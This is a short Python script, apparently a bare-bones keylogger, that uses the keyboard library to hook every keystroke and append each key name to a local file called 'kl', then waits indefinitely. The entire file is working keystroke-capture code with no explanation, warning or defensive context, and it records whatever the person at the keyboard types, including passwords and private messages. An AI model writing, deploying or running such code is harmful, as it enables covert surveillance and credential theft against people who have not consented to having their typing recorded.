import keyboard

def tecla(event):
    with open('kl', 'a') as f:
        f.write(f'{event.name}')

keyboard.hook(tecla)
keyboard.wait()


